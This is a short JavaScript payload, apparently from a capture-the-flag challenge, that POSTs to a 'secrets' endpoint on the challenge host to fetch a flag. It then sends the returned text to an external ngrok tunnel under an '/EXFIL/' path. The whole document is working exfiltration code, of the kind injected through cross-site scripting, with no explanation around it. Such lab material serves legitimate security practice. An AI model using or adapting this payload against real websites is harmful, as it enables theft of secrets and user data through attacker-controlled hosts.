fetch("https://nessus-badwaf.chals.io/secrets", {
  method: "post",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "secret_name=flag"
}).then(res => {
  if (res.ok) {
    return res.text().then(txt => {
      console.log("Secrets Response: " + txt);
      return fetch("https://f2af-99-61-65-255.ngrok-free.app/EXFIL/" + txt);
    })
  } else {
    console.error("Secrets Request Failed")
  }
});

